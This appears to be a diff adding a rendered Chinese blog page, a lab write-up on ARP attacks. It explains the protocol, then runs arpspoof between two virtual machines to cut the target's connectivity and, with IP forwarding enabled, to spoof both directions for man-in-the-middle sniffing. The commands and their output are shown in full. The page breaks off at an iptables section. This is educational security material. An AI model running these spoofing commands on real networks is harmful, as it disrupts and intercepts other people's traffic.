@@ -1,0 +1,891 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/portrait.jpg">
+  <link rel="icon" href="/img/portrait.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Lane Gong">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="摘要：本篇博客记录了ARP攻击和防御的实战，主要从ARP协议，ARP攻击原理，以及搭环境实战攻击和防御的角度记录的，攻击和防御只选取了部分方法，还有很多其他方式或工具，未展开，不足之处，感谢指正！">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ARP攻击与防御">
+<meta property="og:url" content="https://lanegong.github.io/posts/a7a0edbb.html">
+<meta property="og:site_name" content="Lane&#39;s Blog">
+<meta property="og:description" content="摘要：本篇博客记录了ARP攻击和防御的实战，主要从ARP协议，ARP攻击原理，以及搭环境实战攻击和防御的角度记录的，攻击和防御只选取了部分方法，还有很多其他方式或工具，未展开，不足之处，感谢指正！">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://lanegong.github.io/images/postimage/arp2.png">
+<meta property="article:published_time" content="2022-03-02T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-03-03T11:14:43.860Z">
+<meta property="article:author" content="Lane Gong">
+<meta property="article:tag" content="ARP">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://lanegong.github.io/images/postimage/arp2.png">
+  
+  
+  <title>ARP攻击与防御 - Lane&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hint.css@2/hint.min.css" />
+
+  
+    
+    
+      
+      
+        
+          
+        
+        <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1/themes/prism.min.css" />
+      
+      
+        <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1/plugins/line-numbers/prism-line-numbers.min.css" />
+      
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"lanegong.github.io","root":"/","version":"1.8.14","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":"0aae2bb9475d846643a0f05755d8a37b","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"BQhkuiEuKDoNKUCuKndW69hb-MdYXbMMI","app_key":"rHe0dTOjfn4mDpT4f9RRkf4P","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Lane の Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/background.jpeg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="ARP攻击与防御">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-03-03 00:00" pubdate>
+        2022年3月3日 凌晨
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      11k 字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      91 分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- LeanCloud 统计文章PV -->
+      <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="leancloud-page-views"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">ARP攻击与防御</h1>
+            
+            <div class="markdown-body">
+              <h2 id="摘要："><a href="#摘要：" class="headerlink" title="摘要："></a>摘要：</h2><p>本篇博客记录了ARP攻击和防御的实战，主要从ARP协议，ARP攻击原理，以及搭环境实战攻击和防御的角度记录的，攻击和防御只选取了部分方法，还有很多其他方式或工具，未展开，不足之处，感谢指正！</p>
+<span id="more"></span>
+
+<div class="note note-warning">
+            <p>声明：本博客只是记录学习的过程，用以复习和互相交流学习，共同提升技术！切勿利用技术进行违法活动，后果自负！！维护国家网络安全是义不容辞的使命，网安人必将砥砺躬行！✊🏻</p>
+          </div>
+
+<h2 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h2><p>ARP 协议是“Address Resolution Protocol”（地址解析协议）的缩写。计算机通过 ARP 协议将 IP 地址转换成 MAC 地址。</p>
+<p><strong>工作原理：</strong>在以太网中，数据传输的目标地址是 MAC 地址，一个主机要和另一个主机进行直接通信，必须要知道目标主机的 MAC 地址。计算机使用者通常只知道目标机器的 IP 信息，“地址解析”就是主机在发送帧前将目标 IP 地址转换成目标 MAC 地址的过程。简单地说，ARP 协议主要负责将局域网中的 32 位 IP 地址转换为对应的 48 位物理地址，即网卡的MAC 地址，保障通信顺利进行。 </p>
+<p><img src="/images/postimage/arp1.png" srcset="/img/loading.gif" lazyload></p>
+<p>PC1想要ping IP2，首先对数据包进行封装，封装到MAC地址的时候，PC1会查询自己的ARP缓存表，发现没有IP2和其MAC地址的映射，这样的话，MAC数据帧封装失败（设备通信需要对方的MAC地址，但现在没有）。故为了获取PC2的MAC地址，PC1要发送询问信息，询问PC2的MAC地址。</p>
+<blockquote>
+<p>Question:询问信息也需要对Mac地址封装，那现在没有，应该填什么？</p>
+</blockquote>
+<p>规定当目的MAC地址为ff-ff-ff-ff-ff-ff时，就代表这是一个询问信息。PC2收到这个询问信息后，将这里面的IP1和MAC1添加到本地的ARP缓存表中，然后PC2发送应答信息给PC1（因为缓存表里已经有PC1的IP和MAC的映射了），这个应答信息包含PC2的IP2和MAC2。PC1收到这个应答信息，就获取了PC2的MAC地址，并添加到自己的缓存表中。</p>
+<blockquote>
+<p>注意:目的主机先完成ARP缓存，然后才是源主机完成ARP缓存。</p>
+</blockquote>
+<h2 id="ARP攻击原理"><a href="#ARP攻击原理" class="headerlink" title="ARP攻击原理"></a>ARP攻击原理</h2><p>ARP攻击就是通过伪造IP和MAC地址之间的映射关系，使得网络无法正常通信。攻击主机向局域网内除目标主机之外的所有主机发送假的ARP应答包，其中包含目标主机的IP和假的MAC地址，使得目标主机和其他主机无法通信，实现攻击。</p>
+<h2 id="ARP欺骗原理"><a href="#ARP欺骗原理" class="headerlink" title="ARP欺骗原理"></a>ARP欺骗原理</h2><ol>
+<li><p>伪装成网关</p>
+<p><img src="/images/postimage/arp2.png" srcset="/img/loading.gif" lazyload></p>
+<p>攻击者向目标主机发送ARP应答包将自己伪装成网关，从而使得原先应从目标主机流向真实网关的数据都发送到了攻击主机上。</p>
+</li>
+<li><p>伪装成主机</p>
+<p><img src="/images/postimage/arp3.png" srcset="/img/loading.gif" lazyload></p>
+<p>攻击主机将自己伪装成局域网内的目标主机，将目标主机的IP地址对应的MAC地址替换为攻击主机的MAC地址，使得局域网内其他主机发送给目标主机的报文都流向了攻击主机。</p>
+</li>
+</ol>
+<blockquote>
+<p>注：在实施ARP欺骗时，可以实施单向或双向欺骗。其中，单向欺骗就是伪装成网关单向欺骗目标主机，使目标主机无法正常通信；双向欺骗就是伪装成局域网内的某个主机对目标主机和网关双方都实施ARP欺骗，以达到中间人攻击的目的。</p>
+</blockquote>
+<h2 id="实验环境搭建"><a href="#实验环境搭建" class="headerlink" title="实验环境搭建"></a>实验环境搭建</h2><h3 id="靶机搭建"><a href="#靶机搭建" class="headerlink" title="靶机搭建"></a>靶机搭建</h3><p>靶机系统：ubuntu 20.04.3</p>
+<p>虚拟机版本：Parallel Desktop 17</p>
+<h4 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h4><p>目前采用的是NAT模式，为了方便到时候攻击机与靶机两者之间的通信，故配置静态IP。</p>
+<ol>
+<li><p>terminal进入网卡配置文件夹netplan，查看目录：</p>
+<p><img src="/images/postimage/arp4.png" srcset="/img/loading.gif" lazyload></p>
+</li>
+<li><p>进入网卡配置文件：<code>vi 00-installer-config.yaml</code></p>
+</li>
+<li><p>配置静态IP相关信息</p>
+<div class="code-wrapper"><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">network:
+  ethernets:
+    enp0s5:
+      addresses: [10.211.55.13&#x2F;24]#配置自己的静态IP，参考虚拟机网段，24代表掩码是255.255.255.0
+      dhcp4: no#关闭动态分配IP
+      optional: true
+      gateway4: 10.211.55.1#网关
+      nameservers:
+              addresses: [114.114.114.114]#域名服务器，公用的DNS服务器地址
+  version: 2
+  renderer: NetworkManager
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></li>
+<li><p>网络服务重启：<code>netplan apply</code></p>
+</li>
+</ol>
+<blockquote>
+<p>配置过程中一定要严格注意缩进。</p>
+</blockquote>
+<p>使用ifconfig命令查看靶机IP地址和MAC地址：</p>
+<div class="code-wrapper"><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">root@ubuntu1:&#x2F;etc&#x2F;netplan# ifconfig
+enp0s5: flags&#x3D;4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+        inet 10.211.55.13  netmask 255.255.255.0  broadcast 10.211.55.255
+        inet6 fe80::21c:42ff:febc:890f  prefixlen 64  scopeid 0x20&lt;link&gt;
+        ether 00:1c:42:bc:89:0f  txqueuelen 1000  (Ethernet)
+        RX packets 338  bytes 262675 (262.6 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 635  bytes 61236 (61.2 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags&#x3D;73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 256  bytes 22027 (22.0 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 256  bytes 22027 (22.0 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+root@ubuntu1:&#x2F;etc&#x2F;netplan# <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
+
+<p>➡️靶机IP为我们设定的10.211.55.13，MAC地址为00:1c:42:bc:89:0f。</p>
+<h3 id="攻击主机"><a href="#攻击主机" class="headerlink" title="攻击主机"></a>攻击主机</h3><p>系统：Kali Linux 2021.4a</p>
+<p>虚拟机版本：Parallel Desktop 17</p>
+<p>使用ifconfig查看攻击主机的IP地址和MAC地址：</p>
+<div class="code-wrapper"><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">eth0: flags&#x3D;4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+        inet 10.211.55.12  netmask 255.255.255.0  broadcast 10.211.55.255
+        inet6 fdb2:2c26:f4e4:0:21c:42ff:fe61:22c3  prefixlen 64  scopeid 0x0&lt;global&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div>
+
+<p>Question: 发现由于该系统已经设置了多个网卡，导致eth0网卡中未直接显示eth0网卡的MAC地址。</p>
+<p>Solution: 使用<code>ip addr</code>命令</p>
+<div class="code-wrapper"><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">└─# ip addr    
+1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link&#x2F;loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1&#x2F;8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1&#x2F;128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000                                                     
+    link&#x2F;ether 00:1c:42:61:22:c3 brd ff:ff:ff:ff:ff:ff
+    inet 10.211.55.12&#x2F;24 brd 10.211.55.255 scope global eth0
+       valid_lft forever preferred_lft forever
+    inet6 fdb2:2c26:f4e4:0:21c:42ff:fe61:22c3&#x2F;64 scope global dynamic mngtmpaddr 
+       valid_lft 2591866sec preferred_lft 604666sec
+    inet6 fe80::21c:42ff:fe61:22c3&#x2F;64 scope link 
+       valid_lft forever preferred_lft forever<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
+
+<p>由此可以发现，攻击主机上IP：10.211.55.12，MAC地址： 00:1c:42:61:22:c3。</p>
+<h3 id="通信验证"><a href="#通信验证" class="headerlink" title="通信验证"></a>通信验证</h3><p>为了确保两台机器能够正常通信，使用ping命令判断主机之间网络是否畅通，同样也是能判断我们的目标主机是否存活。</p>
+<div class="code-wrapper"><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#攻击主机ping目标主机
+└─$ ping 10.211.55.13
+PING 10.211.55.13 (10.211.55.13) 56(84) bytes of data.
+64 bytes from 10.211.55.13: icmp_seq&#x3D;1 ttl&#x3D;64 time&#x3D;0.646 ms
+64 bytes from 10.211.55.13: icmp_seq&#x3D;2 ttl&#x3D;64 time&#x3D;0.797 ms
+64 bytes from 10.211.55.13: icmp_seq&#x3D;3 ttl&#x3D;64 time&#x3D;0.439 ms
+64 bytes from 10.211.55.13: icmp_seq&#x3D;4 ttl&#x3D;64 time&#x3D;0.770 ms
+
+#目标主机ping攻击主机
+root@ubuntu1:~# ping 10.211.55.12
+PING 10.211.55.12 (10.211.55.12) 56(84) bytes of data.
+64 bytes from 10.211.55.12: icmp_seq&#x3D;1 ttl&#x3D;64 time&#x3D;0.576 ms
+64 bytes from 10.211.55.12: icmp_seq&#x3D;2 ttl&#x3D;64 time&#x3D;0.909 ms
+64 bytes from 10.211.55.12: icmp_seq&#x3D;3 ttl&#x3D;64 time&#x3D;0.866 ms
+64 bytes from 10.211.55.12: icmp_seq&#x3D;4 ttl&#x3D;64 time&#x3D;0.706 ms<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
+
+<p>验证完毕，二者之间通信网络正常且目标主机存活。</p>
+<h2 id="使用Arpspoof工具实施ARP攻击与欺骗"><a href="#使用Arpspoof工具实施ARP攻击与欺骗" class="headerlink" title="使用Arpspoof工具实施ARP攻击与欺骗"></a>使用Arpspoof工具实施ARP攻击与欺骗</h2><p>Arpspoof是一款专业的ARP欺骗工具。它能够直接欺骗网关，使得通过网关访问网络的计算机全被欺骗，从而达到嗅探和捕获数据包甚至篡改数据的目的。</p>
+<p>语法：arpspoof [选项] host</p>
+<p>[选项]：</p>
+<ul>
+<li>-i interface 指定要使用的接口。</li>
+<li>-t target 指定一台特定主机进行ARP欺骗（如果未指定，则为局域网上的所有主机）</li>
+<li>-r 双向欺骗以捕获两个方向的流量。(仅对-t有效)</li>
+<li>host 指定您希望拦截数据包的host（通常是本地网关）</li>
+</ul>
+<h3 id="ARP断网攻击"><a href="#ARP断网攻击" class="headerlink" title="ARP断网攻击"></a>ARP断网攻击</h3><ol>
+<li><p>查看目标主机当前是否能访问外网</p>
+<div class="code-wrapper"><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">root@ubuntu1:~# ping www.baidu.com
+PING www.a.shifen.com (110.242.68.3) 56(84) bytes of data.
+64 bytes from 110.242.68.3 (110.242.68.3): icmp_seq&#x3D;1 ttl&#x3D;128 time&#x3D;69.8 ms
+64 bytes from 110.242.68.3 (110.242.68.3): icmp_seq&#x3D;2 ttl&#x3D;128 time&#x3D;110 ms
+64 bytes from 110.242.68.3 (110.242.68.3): icmp_seq&#x3D;3 ttl&#x3D;128 time&#x3D;87.7 ms
+64 bytes from 110.242.68.3 (110.242.68.3): icmp_seq&#x3D;4 ttl&#x3D;128 time&#x3D;89.4 ms
+#能够正常上网<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></li>
+<li><p>查看攻击主机和目标主机当前ARP缓存表</p>
+<div class="code-wrapper"><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">└─# arp                     #攻击主机的ARP缓存表                                               
+Address     		HWtype  HWaddress           Flags Mask        Iface
+10.211.55.1     ether   00:1c:42:00:00:18   C                 eth0
+
+root@ubuntu1:~# arp         #目标主机的ARP缓存表
+Address         HWtype  HWaddress           Flags Mask        Iface
+10.211.55.1     ether   00:1c:42:00:00:18   C                 enp0s5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
+
+<p>当前攻击主机和目标主机中都只有一条绑定的ARP记录，这条记录是绑定了网关的IP和MAC地址映射。同时由此地址信息可以确定两台机器没有进行过任何通信。</p>
+<p>➡️当两台主机进行通信时，将互相请求对方的IP地址和MAC地址，也就是我们实施ARP欺骗的时机了。</p>
+</li>
+<li><p>对目标主机实施ARP断网攻击</p>
+<p>在攻击主机terminal上执行命令：<code>arpspoof -i eth0 -t 10.211.55.13 10.211.55.1</code></p>
+<p>通过此命令以及观察下述输出信息，攻击主机向目标主机发送ARP应答包，告诉目标主机网关的MAC地址为自己的MAC地址，而不是网关原本的地址从而开始对目标主机实施ARP欺骗</p>
+<div class="code-wrapper"><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">└─# arpspoof -i eth0 -t 10.211.55.13 10.211.55.1
+0:1c:42:61:22:c3 0:1c:42:bc:89:f 0806 42: arp reply 10.211.55.1 is-at 0:1c:42:61:22:c3
+0:1c:42:61:22:c3 0:1c:42:bc:89:f 0806 42: arp reply 10.211.55.1 is-at 0:1c:42:61:22:c3
+0:1c:42:61:22:c3 0:1c:42:bc:89:f 0806 42: arp reply 10.211.55.1 is-at 0:1c:42:61:22:c3
+0:1c:42:61:22:c3 0:1c:42:bc:89:f 0806 42: arp reply 10.211.55.1 is-at 0:1c:42:61:22:c3
+0:1c:42:61:22:c3 0:1c:42:bc:89:f 0806 42: arp reply 10.211.55.1 is-at 0:1c:42:61:22:c3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></li>
+<li><p>查看目标主机的ARP缓存表</p>
+<div class="code-wrapper"><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">root@ubuntu1:~# arp
+Address         HWtype  HWaddress           Flags Mask          Iface
+10.211.55.12    ether   00:1c:42:61:22:c3   C                   enp0s5
+10.211.55.1     ether   00:1c:42:61:22:c3   C                   enp0s5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></div>
+
+<p>对比上面原来的目标主机的ARP缓存表，以及当前更新后的ARP缓存表，可以发现，缓存表中现在共有两条数据，第一条是攻击主机和目标主机建立过通信了，所以在缓存表中添加了攻击主机的IP和MAC映射。第二条数据则是网关的信息，可以看到网关的MAC地址发生了变化，和攻击主机的MAC地址一致了。</p>
+<p>➡️对目标主机的ARP断网攻击成功了</p>
+</li>
+<li><p>目标主机网络测试</p>
+<div class="code-wrapper"><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">root@ubuntu1:~# ping 110.242.68.3
+PING 110.242.68.3 (110.242.68.3) 56(84) bytes of data.
+^C
+--- 110.242.68.3 ping statistics ---
+316 packets transmitted, 0 received, 100% packet loss, time 322544ms<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
+
+<p>可以发现，目标主机当前无法访问网络，攻击成功。</p>
+</li>
+</ol>
+<blockquote>
+<p>注：ARP断网攻击不是真正意义上的断网，只是因为我们通过ARP欺骗使得目标主机认为我们的攻击主机是网关从而将请求发送到攻击主机上，而我们未做任何响应，则没有返回任何数据给目标主机，从而呈现的断网假象。</p>
+</blockquote>
+<h4 id="断网攻击中遇到的问题"><a href="#断网攻击中遇到的问题" class="headerlink" title="断网攻击中遇到的问题"></a>断网攻击中遇到的问题</h4><p>当我在攻击主机上terminal中输入<code>arpspoof -i eth0 -t 10.211.55.13 10.211.55.1</code>开始攻击后，通过输出我观察到攻击主机在向目标主机发送欺骗的ARP应答包，我认为ARP攻击就生效了遂ctrl+c结束了发送，此时我去目标主机上检查ARP缓存表发现网关MAC地址并没有改变还是正确的，ping百度也仍能ping通，说明网络正常。通过查阅资料，发现：</p>
+<p><strong>网关会定时向局域网广播自身的IP地址和MAC地址，因此在进行ARP欺骗时，也要定时进行，以达到持续欺骗的目的。</strong></p>
+<p>也就是说，我ctrl+c之后就相当于是停止攻击了，之后网关会广播自己正确的IP地址和MAC地址，就又会恢复正常，所以想要实施ARP攻击，这是持续的。</p>
+<h3 id="ARP欺骗和网络嗅探获取目标主机网络数据"><a href="#ARP欺骗和网络嗅探获取目标主机网络数据" class="headerlink" title="ARP欺骗和网络嗅探获取目标主机网络数据"></a>ARP欺骗和网络嗅探获取目标主机网络数据</h3><p>上述ARP断网攻击，使得在攻击时间段时，目标主机可能无法获取想要的网络资源，网络通信发生了错误，但是这从攻击者的角度来说并没有获益什么。故下面进行的是，通过ARP欺骗，目标主机仍能访问网络，使得我们可以在攻击主机上获取目标主机上的网络数据包。</p>
+<p>主要思想：通过ARP欺骗使得用户上网时发送请求至网关（攻击主机的MAC地址），也就是说发到了攻击主机上，之后通过攻击主机转发给真实的网关，接受返回包同理，对网关进行了欺骗，原本是要发往目标主机的，但是现在会发给攻击主机，然后再由攻击主机转发给目标主机。在这之中，攻击主机作为中间人，相当于一个拦截网络流量的代理路由器。</p>
+<p>实现上述目标最关键的一步：<strong>开启路由转发</strong></p>
+<h4 id="开启路由转发"><a href="#开启路由转发" class="headerlink" title="开启路由转发"></a>开启路由转发</h4><p>用户开启路由转发后，其原理就是用于做双端口之间的流量转发，从而使得目标主机就能访问网络了。</p>
+<ol>
+<li><p>在攻击主机terminal中输入命令：<code>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</code></p>
+<p>proc目录代表的是内存，即ip_forward是一个临时文件，用于给此程序读取的。设置为1代表转发，重启后会变回0。当然也可以手动输入关闭。</p>
+</li>
+<li><p>验证</p>
+<div class="code-wrapper"><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">└─# cat &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward
+1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div>
+
+<p>看到此输出则开启成功。</p>
+</li>
+</ol>
+<h4 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h4><blockquote>
+<p>注：当前目标主机能够访问外网</p>
+</blockquote>
+<ol>
+<li><p>对目标主机和网关同时实施ARP欺骗</p>
+<div class="code-wrapper"><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">└─# arpspoof -i eth0 -t 10.211.55.13 -r 10.211.55.1
+0:1c:42:61:22:c3 0:1c:42:bc:89:f 0806 42: arp reply 10.211.55.1 is-at 0:1c:42:61:22:c3
+0:1c:42:61:22:c3 0:1c:42:0:0:18 0806 42: arp reply 10.211.55.13 is-at 0:1c:42:61:22:c3
+0:1c:42:61:22:c3 0:1c:42:bc:89:f 0806 42: arp reply 10.211.55.1 is-at 0:1c:42:61:22:c3
+0:1c:42:61:22:c3 0:1c:42:0:0:18 0806 42: arp reply 10.211.55.13 is-at 0:1c:42:61:22:c3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></li>
+<li><p>验证</p>
+<div class="code-wrapper"><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#目标主机上操作
+root@ubuntu1:~# arp
+Address        HWtype  HWaddress           Flags Mask            Iface
+10.211.55.12   ether   00:1c:42:61:22:c3   C                     enp0s5
+10.211.55.1    ether   00:1c:42:61:22:c3   C                     enp0s5
+#攻击成功<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
+
+<p>ping外部网络</p>
+<div class="code-wrapper"><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">root@ubuntu1:~# ping 110.242.68.4
+PING 110.242.68.4 (110.242.68.4) 56(84) bytes of data.
+^C
+--- 110.242.68.4 ping statistics ---
+13 packets transmitted, 0 received, 100% packet loss, time 12281ms<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
+
+<p>发现问题，还是ping不通。</p>
+</li>
+<li><p>解决路由转发出错问题</p>
+<p>通过反复检查，确实路由转发功能已经开启，<code>cat /proc/sys/net/ipv4/ip_forward</code>命令的输出结果为1。也曾想过是否是虚拟机网络模式的问题，尝试NAT改桥接模式，发现问题还是无法解决，开启路由转发后，进行ARP攻击目标主机仍是上不了网。</p>
+<p>最终，在<a target="_blank" rel="noopener" href="https://www.v2ex.com/t/255279">fedora23 开启 IP 转发无效，求解</a>这篇文章中找到了答案，问题出现在了<strong>linux防火墙</strong>上，防火墙未允许数据包的转发，所以导致即时开启了路由转发功能，仍不能奏效的原因。</p>
+<p><strong>iptables防火墙简介：</strong></p>
